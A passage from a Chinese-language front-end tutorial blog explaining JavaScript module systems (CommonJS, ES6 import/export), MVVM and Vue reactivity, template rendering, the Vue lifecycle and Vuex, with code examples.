class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>); <span class="comment">// 依赖可以就近书写</span></span><br><span class="line">  a.doSomething();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b'</span>);</span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h3><p><code>CommonJS</code> 规范是通过 <code>module.export</code> 来定义的，在前端浏览器中，并不支持 <code>module.export</code>，<code>Nodejs</code> 端是使用 <code>CommonJS</code> 规范的，前端浏览器一般使用 <code>AMD</code>、<code>CMD</code>、<code>ES6</code>等定义模块化开发的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> addX = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value + x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports.x = x;</span><br><span class="line"><span class="built_in">module</span>.exports.addX = addX;</span><br></pre></td></tr></table></figure></p><p>为了方便，<code>Node</code> 为每个模块提供一个 <code>exports</code> 变量，指向 <code>module.exports</code>，相当于在文件的开头定义了：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exports = <span class="built_in">module</span>.exports;</span><br></pre></td></tr></table></figure></p><p>案例：</p><p>math.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 累加函数</span></span><br><span class="line">exports.add = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = <span class="number">0</span>, i = <span class="number">0</span>, args = <span class="built_in">arguments</span>, len = args.length;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; len) &#123;</span><br><span class="line">    sum += args[i++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>increment.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">'math'</span>).add;</span><br><span class="line">exports.increment = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> add(val, <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>index.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> increment = <span class="built_in">require</span>(<span class="string">'increment'</span>).increment;</span><br><span class="line"><span class="keyword">var</span> a = increment(<span class="number">1</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p><p>一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为 <code>global</code> 对象的属性。</p><p>输出模块变量的最好方法是使用 <code>module.exports</code> 对象。</p><p>加载模块使用 <code>require</code> 方法，该方法读取一个文件并执行，返回文件内部的 <code>module.exports</code>对象。</p><h3 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h3><p><code>es6</code> 中使用 <code>import/export</code> 来进行导出导入</p><ul><li><p>示例：<br>lib.js导出:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导出常量</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> sqrt = <span class="built_in">Math</span>.sqrt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">diag</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sqrt(square(x) + square(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.js导入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; square, diag &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(square(<span class="number">11</span>)); <span class="comment">// 121</span></span><br><span class="line"><span class="built_in">console</span>.log(diag(<span class="number">4</span>, <span class="number">3</span>)); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure></li><li><p>特殊语法<br>1、我们可以使用 <code>export default a</code> 来默认导出一个模块，相当于匿名导出</p><p>common.js导出:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设定一个默认输出模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> openApp() &#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了一个默认的模块之外，其余的使用正常的导出</span></span><br><span class="line"><span class="keyword">export</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> showToast = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>main.js导入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注：对于默认导出的模块，我们可以另行设置一个名字，其他的必须与导出时的名字一致</span></span><br><span class="line"><span class="keyword">import</span> open_app, &#123; showAlert, showToast &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">open_app();</span><br><span class="line">showAlert();</span><br><span class="line">showToast();</span><br></pre></td></tr></table></figure><p>2、在 <code>export</code> 导出 或 <code>import</code> 导入的时候使用 <code>xx as yy</code> 来设置一个别名<br>2.1 导出时设置别名：</p><p>common.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  showAlert <span class="keyword">as</span> show_alert,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>main.js导入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; show_alert &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">show_alert();</span><br></pre></td></tr></table></figure><p>2.2 导入时设置别名：<br>common.js导出:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; showAlert &#125;;</span><br></pre></td></tr></table></figure><p>main.js导入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; showAlert <span class="keyword">as</span> show_alert &#125; <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">show_alert();</span><br></pre></td></tr></table></figure><p>3、使用通配符 <code>*</code> 来指定一个对象，将所有的输出都挂载改对象上，通常 <code>*</code> 会结合 <code>as</code> 使用<br>common.js导出:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> showAlert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> showToast = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ***</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>main.js导入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> common <span class="keyword">from</span> <span class="string">'./common.js'</span>;</span><br><span class="line"></span><br><span class="line">common.showAlert();</span><br><span class="line">common.showToast();</span><br></pre></td></tr></table></figure><p>4、建议<br>当我们明确知道自己需要使用哪些依赖时，我们应该按需加载，只 <code>import</code> 我们需要的那些依赖，这样在打包的时候可以忽略掉其他未使用，减少文件体积。</p></li></ul><hr><h2 id="M-V-VM"><a href="#M-V-VM" class="headerlink" title="M-V-VM"></a>M-V-VM</h2><blockquote><p>参考<a href="https://segmentfault.com/a/1190000015895017" target="_blank" rel="noopener">segmentfault MVVM框架理解及其原理实现</a></p></blockquote><p>说起 <code>MVVM</code>，就不得不先说下 <code>MVC</code>。<br><img src="../images/other/other-mvc.png" title="MVC关系图"></p><p>分成 <code>Model</code>、<code>View</code>、<code>Controller</code>，视图上发生变化，通过 <code>Controller</code>（控件）将响应传入到 <code>Model</code>（数据源），由数据源改变 <code>View</code> 上面的数据。<strong>MVC框架允许View和Model直接进行通信！！</strong></p><p>但是 <code>View</code> 和 <code>Model</code> 之间随着业务量的不断庞大，会出现蜘蛛网一样难以处理的依赖关系，完全背离了开发所应该遵循的“开放封闭原则”。</p><p>面对这个问题，<code>MVVM</code> 框架就出现了，它与 <code>MVC</code> 框架的主要区别有两点：<br><strong>1、实现数据与视图的分离</strong><br><strong>2、通过数据来驱动视图，开发者只需要关心数据变化，DOM操作被封装了。</strong></p><p><img src="../images/other/other-mvvm.png" title="MVVM关系图"></p><p>可以看到 <code>MVVM</code> 分别指 <code>View</code>、<code>Model</code>、<code>View-Model</code>，<code>View</code> 通过 <code>View-Model</code> 的 <code>DOM Listeners</code> 将事件绑定到 <code>Model</code> 上，而 <code>Model</code> 则通过 <code>Data Bindings</code> 来管理 <code>View</code> 中的数据，<code>View-Model</code> 从中起到一个连接桥的作用。</p><h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><ul><li><p><strong>响应式：vue如何监听data的属性变化</strong><br>假设 <code>data</code> 开始是这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'zhangsan'</span>,</span><br><span class="line">  age: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当执行修改操作，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.name) <span class="comment">// 访问</span></span><br><span class="line">obj.age = <span class="number">22</span>; <span class="comment">// 修改</span></span><br></pre></td></tr></table></figure><p>但是这样的操作vue本身是没有办法感知到的，那么应该如何让vue知道我们进行了访问或是修改的操作呢？<br>那就要使用 <code>Object.defineProperty</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = &#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> data = &#123;</span><br><span class="line">    name: <span class="string">'zhangsan'</span>,</span><br><span class="line">    age: <span class="number">20</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> key, value</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123; <span class="comment">// 遍历data中所有的字段</span></span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(vm, key, &#123;</span><br><span class="line">        get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'get'</span>, data[key]) <span class="comment">// 监听</span></span><br><span class="line">          <span class="keyword">return</span> data[key]</span><br><span class="line">        &#125;,</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'set'</span>, newVal) <span class="comment">// 监听</span></span><br><span class="line">          data[key] = newVal</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)(key)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>Object.defineProperty</code> 将data里的每一个属性的访问与修改都变成了一个函数，在函数get和set中我们即可监听到data的属性发生了改变。</p></li><li><p><strong>模板解析：vue的模板是如何被解析的</strong><br>模板本质上是一串字符串，它看起来和 <code>html</code> 的格式很相像，实际上有很大的区别，因为模板本身还带有逻辑运算，比如 <code>v-if</code>，<code>v-for</code> 等等，但它最后还是要转换为 <code>html</code> 来显示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"add"</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in list"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>模板在 <code>vue</code> 中必须转换为 <code>JS</code> 代码，原因在于：在前端环境下，只有 <code>JS</code> 才是一个图灵完备语言，才能实现逻辑运算，以及渲染为 <code>html</code> 页面。</p><p>这里就引出了vue中一个特别重要的函数——<strong>render</strong></p><p><code>render</code> 函数中的核心就是 <code>with</code> 函数。</p><blockquote><p>with: with函数将某个对象添加到作用域链的顶部，如果在 statement中有某个未使用命名空间的变量，跟作用域链中的某个属性同名，则这个变量将指向这个属性值。</p></blockquote><p>上例中使用 <code>with</code> 解析的过程如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span>(<span class="keyword">this</span>)&#123;  <span class="comment">// this 就是 vm</span></span><br><span class="line">    <span class="keyword">return</span> _c(</span><br><span class="line">        <span class="string">'div'</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            attrs:&#123;<span class="string">"id"</span>:<span class="string">"app"</span>&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        [</span><br><span class="line">            _c(</span><br><span class="line">                <span class="string">'div'</span>,</span><br><span class="line">                [</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'input'</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            directives:[</span><br><span class="line">                                &#123;</span><br><span class="line">                                    name:<span class="string">"model"</span>,</span><br><span class="line">                                    rawName:<span class="string">"v-model"</span>,</span><br><span class="line">                                    value:(title),</span><br><span class="line">                                    expression:<span class="string">"title"</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            domProps:&#123;</span><br><span class="line">                                <span class="string">"value"</span>:(title)</span><br><span class="line">                            &#125;,</span><br><span class="line">                            on:&#123;</span><br><span class="line">                                <span class="string">"input"</span>:<span class="function"><span class="keyword">function</span>(<span class="params">$event</span>)</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>($event.target.composing)<span class="keyword">return</span>;</span><br><span class="line">                                    title=$event.target.value</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ),</span><br><span class="line">                    _v(<span class="string">" "</span>),</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'button'</span>,</span><br><span class="line">                        &#123;</span><br><span class="line">                            on:&#123;</span><br><span class="line">                                <span class="string">"click"</span>:add</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        [_v(<span class="string">"submit"</span>)]</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            ),</span><br><span class="line">            _v(<span class="string">" "</span>),</span><br><span class="line">            _c(<span class="string">'div'</span>,</span><br><span class="line">                [</span><br><span class="line">                    _c(</span><br><span class="line">                        <span class="string">'ul'</span>,</span><br><span class="line">                        _l((list),<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;<span class="keyword">return</span> _c(<span class="string">'li'</span>,[_v(_s(item))])&#125;)</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的 <code>_c</code> 函数表示的是创建一个新的html元素，其基本用法为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_c(element,&#123;attrs&#125;,[children...])</span><br></pre></td></tr></table></figure><p>其中的element表示所要创建的html元素类型，attrs表示所要创建的元素的属性，children表示该html元素的子元素。</p><p><code>_v</code> 函数表示创建一个文本节点，<code>_l</code> 函数表示创建一个数组。</p><p>最终render函数返回的是一个虚拟DOM。</p></li></ul><ul><li><p><strong>渲染：vue模板是如何被渲染成HTML的</strong></p><p>模板渲染为html分为两种情况:</p><p>1、初次渲染的时候<br>2、渲染之后数据发生改变的时候</p><p>它们都需要调用updateComponent,其形式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm._update(vnode)&#123;</span><br><span class="line">  <span class="keyword">const</span> prevVnode = vm._vnode</span><br><span class="line">  vm._vnode = vnode</span><br><span class="line">  <span class="keyword">if</span> (!prevVnode)&#123;</span><br><span class="line">    vm.$el = vm.__patch__(vm.$el,vnode)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    vm.$el = vm.__patch__(prevVnode,vnode)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateComponent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  vm._update(vm._render())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先读取当前的虚拟DOM——<code>vm._vnode</code>,判断其是否为空，若为空，则为初次渲染，将虚拟DOM全部渲染到所对应的容器当中（vm.$el），若不为空，则是数据发生了修改，通过响应式我们可以监听到这一情况，使用diff算法完成新旧对比并修改。</p></li></ul><h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ul><li>低耦合</li><li>可重用</li><li>独立开发</li><li>易测试</li></ul><hr><h2 id="Vue双向绑定原理"><a href="#Vue双向绑定原理" class="headerlink" title="Vue双向绑定原理"></a>Vue双向绑定原理</h2><blockquote><p>参考：<a href="https://segmentfault.com/a/1190000006599500" target="_blank" rel="noopener">segmentfault 剖析Vue原理&amp;实现双向绑定MVVM</a></p></blockquote><p>通过 <code>Object.defineProperty()</code> 来劫持各个属性的setter，getter在数据变动时给订阅者发送消息，触发相应的监听回调.<br>Vue 会把props、data 等变成响应式对象，在创建过程中，发现子属性也为对象则会递归把该对象也变成响应式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = &#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> data = &#123;</span><br><span class="line">    name: <span class="string">'zhangsan'</span>,</span><br><span class="line">    age: <span class="number">20</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> key, value</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123; <span class="comment">// 遍历data中所有的字段</span></span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(vm, key, &#123;</span><br><span class="line">        get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'get'</span>, data[key]) <span class="comment">// 监听</span></span><br><span class="line">          <span class="keyword">return</span> data[key]</span><br><span class="line">        &#125;,</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'set'</span>, newVal) <span class="comment">// 监听</span></span><br><span class="line">          data[key] = newVal</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)(key)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="../images/vue/vue.png" title="Vue双向绑定原理图"></p><ol><li>实现一个数据监听器 <code>Observer</code>，能够对数据对象的所有属性进行监听，如果有变动则拿到最新值并通知订阅者。</li><li>实现一个指令解析器 <code>Compiled</code>，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图</li><li>实现一个 <code>Watcher</code>，作为链接 <code>Observer</code> 和 <code>Compiled</code> 的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图。</li></ol><hr><h2 id="Vue生命周期-v2-0"><a href="#Vue生命周期-v2-0" class="headerlink" title="Vue生命周期(v2.0)"></a>Vue生命周期(v2.0)</h2><table><thead><tr><th style="text-align:left">生命周期</th><th style="text-align:left">表现</th></tr></thead><tbody><tr><td style="text-align:left">beforeCreated</td><td style="text-align:left">组件实例刚被创建，组件属性计算之前，如data属性</td></tr><tr><td style="text-align:left">created</td><td style="text-align:left">组件实例创建完成，属性已绑定，但是DOM还未生成，$el属性还不存在</td></tr><tr><td style="text-align:left">beforeMounted</td><td style="text-align:left">模板编译/挂载之前</td></tr><tr><td style="text-align:left">mounted</td><td style="text-align:left">模板编译/挂载之后</td></tr><tr><td style="text-align:left">beforeUpdate</td><td style="text-align:left">组件更新之前</td></tr><tr><td style="text-align:left">updatee</td><td style="text-align:left">组件更新之后</td></tr><tr><td style="text-align:left">activated</td><td style="text-align:left">for <code>keep-alive</code>，组件被激活时调用</td></tr><tr><td style="text-align:left">deactivated</td><td style="text-align:left">for <code>keep-alive</code>，组件被移除时调用</td></tr><tr><td style="text-align:left">beforeDestory</td><td style="text-align:left">组件销毁前</td></tr><tr><td style="text-align:left">destoryed</td><td style="text-align:left">组件销毁后</td></tr></tbody></table><hr><h2 id="Vuex原理"><a href="#Vuex原理" class="headerlink" title="Vuex原理"></a>Vuex原理</h2><p>A组件 通过 <code>actions</code> 中的事件处理 dispatch 一个 <code>mutations</code> 事件(驼峰式命名)<br>=&gt;<br><code>mutations</code> 来接收上面的事件，并触发 <code>state</code> 状态改变(大写下划线命名)<br>=&gt;<br><code>state</code> 响应上面的改变，并存储下来，<code>state</code> 专门用来存储交互的date数据<br>=&gt;<br>B组件 通过 <code>getters</code> 来接收 上面 <code>state</code> 的状态</p><p><img src="../images/vue/vuex.png" title="Vuex原理图"></p><p>即：<br><code>Actions</code> 通过分发 <code>mutations</code> 来修改 <code>store</code> 实例的状态；<br><code>Store</code> 实例的状态变化反过来又通过 <code>getters</code> 被组件获知。</p><p>见<a href="/vue/vuex%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1.html">vuex组件间通信</a></p><hr><h2 id="vue-router-原理"><a href="#vue-router-原理" class="headerlink" title="vue-router 原理"></a>vue-router 原理</h2><hr><h2 id="Promise原理"><a href="#Promise原理" class="headerlink" title="Promise原理"></a>Promise原理</h2><hr><h2 id="html2canvas原理"><a href="#html2canvas原理" class="headerlink" 